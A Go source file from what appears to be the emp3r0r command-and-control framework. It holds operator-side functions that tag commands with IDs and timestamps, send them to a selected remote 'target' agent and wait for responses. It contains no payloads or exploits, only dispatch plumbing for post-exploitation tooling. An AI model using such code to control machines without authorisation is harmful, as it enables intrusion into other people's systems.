package agents

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SendCmd send command to agent
func SendCmd(cmd, cmd_id string, a *emp3r0r_def.Emp3r0rAgent) error {
	if a == nil {
		return errors.New("SendCmd: agent not found")
	}

	var cmdData emp3r0r_def.MsgTunData

	// add UUID to each command for tracking
	if cmd_id == "" {
		cmd_id = uuid.New().String()
	}

	// parse command
	cmdSlice := util.ParseCmd(cmd)
	cmdData.CmdSlice = cmdSlice
	cmdData.Tag = a.Tag
	cmdData.CmdID = cmd_id

	// timestamp
	cmdData.Time = time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST")
	def.CmdTimeMutex.Lock()
	def.CmdTime[cmd_id] = cmdData.Time
	def.CmdTimeMutex.Unlock()

	if !strings.HasPrefix(cmd, "!") {
		go wait_for_cmd_response(cmd, cmd_id, a)
	}

	return SendMessageToAgent(&cmdData, a)
}

func wait_for_cmd_response(cmd, cmd_id string, agent *emp3r0r_def.Emp3r0rAgent) {
	ctrl, exists := def.AgentControlMap[agent]
	if !exists || agent == nil {
		logging.Warningf("SendCmd: agent '%s' not connected", agent.Tag)
		return
	}
	now := time.Now()
	for ctrl.Ctx.Err() == nil {
		if resp, exists := def.CmdResults[cmd_id]; exists {
			logging.Debugf("Got response for %s from %s: %s", strconv.Quote(cmd), strconv.Quote(agent.Name), resp)
			return
		}
		wait_time := time.Since(now)
		if wait_time > 90*time.Second && !waitNeeded(cmd) {
			logging.Warningf("Executing %s on %s: unresponsive for %v",
				strconv.Quote(cmd),
				strconv.Quote(agent.Name),
				wait_time)
			return
		}
		util.TakeABlink()
	}
}

func waitNeeded(cmd string) bool {
	return strings.HasPrefix(cmd, "!") || strings.HasPrefix(cmd, "get") || strings.HasPrefix(cmd, "put ")
}

// SendCmdToCurrentTarget send a command to currently selected agent
func SendCmdToCurrentTarget(cmd, cmd_id string) error {
	// target
	target := MustGetActiveAgent()
	if target == nil {
		return fmt.Errorf("you have to select a target first")
	}

	// send cmd
	return SendCmd(cmd, cmd_id, target)
}

// MustGetActiveAgent check if current target is set and alive
func MustGetActiveAgent() (target *emp3r0r_def.Emp3r0rAgent) {
	// find target
	target = def.ActiveAgent
	if target == nil {
		logging.Debugf("Validate active target: target does not exist")
		return nil
	}

	// write to given target's connection
	tControl := def.AgentControlMap[target]
	if tControl == nil {
		logging.Debugf("Validate active target: agent control interface not found")
		return nil
	}
	if tControl.Conn == nil {
		logging.Debugf("Validate active target: agent is not connected")
		return nil
	}

	return
}
